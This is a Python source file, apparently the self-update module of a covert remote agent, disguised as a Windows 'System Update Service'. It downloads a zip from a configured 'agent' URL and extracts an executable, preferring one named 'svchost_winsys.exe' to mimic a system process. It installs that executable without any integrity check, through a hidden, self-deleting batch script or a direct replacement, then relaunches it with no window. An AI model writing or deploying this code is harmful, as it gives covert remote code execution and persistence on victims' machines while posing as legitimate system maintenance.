# ============================================
# updater_svc.py - System Update Service
# ============================================
# Servicio de actualizaciones del sistema Windows
# No modificar - Mantenimiento automático

import os
import sys
import time
import shutil
import tempfile
import subprocess
import requests
import zipfile
import json
from datetime import datetime
import sys_config as config

class SystemUpdater:
    def __init__(self):
        self.version_actual = config.VERSION_ACTUAL
        self.url_version = config.URL_VERSION
        self.url_agente = config.URL_AGENTE
        self.install_path = config.INSTALL_PATH
        self.ultima_verificacion = 0
        
    def verificar_actualizacion(self):
        try:
            response = requests.get(self.url_version, timeout=5)
            if response.status_code == 200:
                nueva_version = response.text.strip()
                if nueva_version and nueva_version != self.version_actual:
                    print(f"[*] Nueva versión disponible: {nueva_version} (actual: {self.version_actual})")
                    return True, nueva_version
                else:
                    print(f"[✓] Sistema actualizado: {self.version_actual}")
                    return False, self.version_actual
            else:
                print(f"[!] No se pudo verificar actualizaciones: HTTP {response.status_code}")
                return False, self.version_actual
                
        except Exception as e:
            print(f"[!] Error verificando actualizaciones: {e}")
            return False, self.version_actual
    
    def descargar_actualizacion(self):
        try:
            temp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(temp_dir, "system_update.zip")
            
            print(f"[*] Descargando actualización desde {self.url_agente}")
            response = requests.get(self.url_agente, stream=True, timeout=30)
            
            if response.status_code == 200:
                total_size = int(response.headers.get('content-length', 0))
                with open(zip_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                if os.path.getsize(zip_path) > 1000000:
                    print(f"[✓] Descarga completada: {os.path.getsize(zip_path) / 1024 / 1024:.2f} MB")
                    return zip_path
                else:
                    print(f"[!] El paquete descargado es demasiado pequeño: {os.path.getsize(zip_path)} bytes")
                    return None
            else:
                print(f"[!] Error descargando: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[!] Error descargando actualización: {e}")
            return None
    
    def instalar_actualizacion(self, zip_path):
        try:
            print("[*] Instalando actualización del sistema...")
            
            extract_dir = tempfile.mkdtemp()
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            
            nuevo_exe = None
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    if file.lower() == "svchost_winsys.exe" or file.endswith(".exe"):
                        nuevo_exe = os.path.join(root, file)
                        break
                if nuevo_exe:
                    break
            
            if not nuevo_exe:
                print("[!] No se encontró el ejecutable del sistema")
                self._limpiar_temp(extract_dir)
                return False
            
            batch_path = self._crear_script_actualizacion(nuevo_exe)
            
            if batch_path:
                print("[*] Ejecutando actualización...")
                subprocess.Popen([batch_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return True
            else:
                return self._reemplazar_directo(nuevo_exe)
                
        except Exception as e:
            print(f"[!] Error instalando actualización: {e}")
            return False
    
    def _crear_script_actualizacion(self, nuevo_exe):
        try:
            exe_actual = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            if getattr(sys, 'frozen', False):
                exe_actual = sys.executable
            
            batch_content = f"""@echo off
title Sistema - Actualizador
echo Aplicando actualización del sistema...

:: Esperar proceso
timeout /t 3 /nobreak >nul

:: Reemplazar ejecutable
copy /Y "{nuevo_exe}" "{exe_actual}"

:: Verificar
if exist "{exe_actual}" (
    echo ✅ Sistema actualizado
    echo Iniciando...
    start "" "{exe_actual}"
) else (
    echo ❌ Error al actualizar
)

:: Limpiar temporales
rmdir /s /q "{os.path.dirname(nuevo_exe)}" 2>nul
rmdir /s /q "{os.path.dirname(os.path.dirname(nuevo_exe))}" 2>nul

:: Eliminar este script
del "%~f0" 2>nul
"""
            
            batch_path = os.path.join(tempfile.gettempdir(), "sys_update.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            return batch_path
            
        except Exception as e:
            print(f"[!] Error creando script: {e}")
            return None
    
    def _reemplazar_directo(self, nuevo_exe):
        try:
            exe_actual = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            backup_path = exe_actual + ".old"
            if os.path.exists(exe_actual):
                if os.path.exists(backup_path):
                    os.remove(backup_path)
                os.rename(exe_actual, backup_path)
            
            shutil.copy2(nuevo_exe, exe_actual)
            
            if os.path.exists(exe_actual):
                print("[✓] Actualización completada")
                subprocess.Popen([exe_actual], creationflags=subprocess.CREATE_NO_WINDOW)
                return True
            else:
                if os.path.exists(backup_path):
                    os.rename(backup_path, exe_actual)
                return False
                
        except Exception as e:
            print(f"[!] Error en actualización directa: {e}")
            return False
    
    def _limpiar_temp(self, path):
        try:
            if os.path.exists(path):
                shutil.rmtree(path, ignore_errors=True)
        except:
            pass
    
    def ciclo_actualizacion(self):
        while True:
            try:
                if time.time() - self.ultima_verificacion >= config.VERIFICAR_ACTUALIZACION_INTERVALO:
                    print(f"[*] Verificando actualizaciones del sistema...")
                    hay_actualizacion, nueva_version = self.verificar_actualizacion()
                    
                    if hay_actualizacion:
                        zip_path = self.descargar_actualizacion()
                        if zip_path:
                            exito = self.instalar_actualizacion(zip_path)
                            if exito:
                                print("[✓] Sistema actualizado, reiniciando...")
                                return True
                            else:
                                print("[!] Error al actualizar")
                    
                    self.ultima_verificacion = time.time()
                
                time.sleep(60)
                
            except Exception as e:
                print(f"[!] Error en servicio de actualización: {e}")
                time.sleep(300)